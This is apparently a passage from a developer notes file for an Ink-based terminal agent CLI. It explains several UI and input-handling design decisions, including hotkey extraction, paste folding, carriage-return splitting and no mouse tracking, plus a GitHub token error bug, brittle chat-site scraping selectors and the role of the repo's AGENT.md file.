  `poller.start()` emits `auth_rejected`, and its only listener is wired in the
  `WebSocketServer` constructor — which used to run *after* that call. So the
  401 message ("GitHub rejected the stored token… clear it with
  `/github remove-token`") was emitted into an EventEmitter with nobody
  attached, and an expired token produced no GitHub activity and no reason why.
  The later `pollNow()` 401 at `github-poller.js:147` always worked; only the
  startup one was unreachable.

- **A row in the live frame is truncated from the right, so put the part that
  must survive on the left.** The filed-session row read `↺ Previous
  conversation filed (2 turns) — --resume <28-char id>`, which is ~80
  characters: at 80 columns `wrap="truncate"` ate the end of the id and offered
  a `--resume` that resumes nothing. Leading with the id and trailing the prose
  costs nothing and degrades correctly — at 60 columns the sentence is cut and
  the command is still intact.

- **No mouse tracking, ever.** Terminal mouse reporting and native scroll are mutually
  exclusive: a terminal that is tracking hands the app the wheel and suppresses drag-select. The
  app therefore enables nothing, and `cli-ui.jsx` writes the disable sequences once on startup
  in case a crashed run left the terminal tracking. Scroll, drag-select and copy are the
  terminal's, exactly as in Claude Code. Everything that used to be clickable is a keybinding.
- **The transcript has no selection model.** `Ctrl+E` toggles verbosity for the *whole*
  transcript rather than one row, because there is nothing to point at a single row with. Ink
  cannot repaint what `<Static>` has committed, so `toggleVerbose` clears the screen and lets
  Static print the transcript again at the new setting — that one clear per keypress is
  deliberate and is the only `ESC[2J` the app writes. ↑/↓ always mean input history.
- **`ink-text-input` types every key it does not recognise.** Its handler special-cases exactly
  one chord, ctrl+c, so a ctrl+e handled in `useKeyBindings` still left a stray `e` in the
  prompt — and ctrl+o, ctrl+t and ctrl+v their letters. Ink offers no way to stop a `useInput`
  handler running, and the text field's is registered first (child effects run before the
  parent's). So the chords never reach Ink at all: `cli-ui.jsx` pulls them out of the stdin
  chunk via `hotkeys.js` and dispatches them through `use-hotkeys.js`. Adding a new ctrl+ binding
  means adding it to `HOTKEYS`, not to `useKeyBindings`.
- **A paste is folded to a marker, not typed into the prompt.** `usePaste` (Ink 7) turns on
  bracketed paste, which is the only thing that distinguishes "pasted forty lines" from "typed
  forty lines very fast" — and it keeps the text off `useInput` entirely. `paste.js` swaps
  anything over four lines for `[Pasted text #1 +42 lines]` and `App.handleSubmit` expands it on
  the way to the model. This is a frame-budget rule as much as a legibility one: the input box
  is in the live frame, and a pasted file is the easiest way to blow the viewport.
- **Ink never reads the real stdin.** `cli-ui.jsx` pipes `process.stdin` through a PassThrough
  so `enter-splitter.js` can peel a trailing `\r` into a chunk of its own. Ink's input parser
  deliberately does not split `\r` from adjacent text (a CR can sit inside a paste), so when the
  terminal delivers the last typed character and the Enter after it in one read — routine when
  typing fast, over ssh, in tmux, or on key repeat — Ink sees `"i\r"` with `key.return` false,
  `ink-text-input` types the CR into the prompt, and **the message is silently never sent**. The
  second write is deferred with `setImmediate`, because Ink's `read()` drains everything
  buffered and two back-to-back writes would arrive as the one chunk this exists to split.
- Running the CLI without a TTY fails with Ink's "Raw mode is not supported". That is the
  harness, not a bug — use `script -q /dev/null <cmd>` to test under a pty.
- Content-script DOM selectors break when the chat sites change; `extractLatestResponse` must
  wait for a *new* block before scraping. Gemini's editor only ingests text via a synthetic
  `ClipboardEvent('paste')` — setting `innerHTML` breaks it.
- `AGENT.md` at the repo root is *workspace* context read by `prompt-builder.js`, not
  instructions for you. It belongs to whatever project the agent is pointed at. It was the
  unedited stock template until 2026-09-16 — 740 bytes of `<!-- Describe your project here -->`
  going into every turn-0 prompt as this project's context, because `_loadAgentMd` skips a file
  only when its trimmed body is *empty* and a template full of headings is not. It now says what
  this project is; `instruction-sources.js` flags the template state so the next one cannot sit
  there unnoticed.
- The agent defaults to `--workspace ../`, so running it here makes it operate on its own repo.
  That is why this repo kept accumulating agent state.
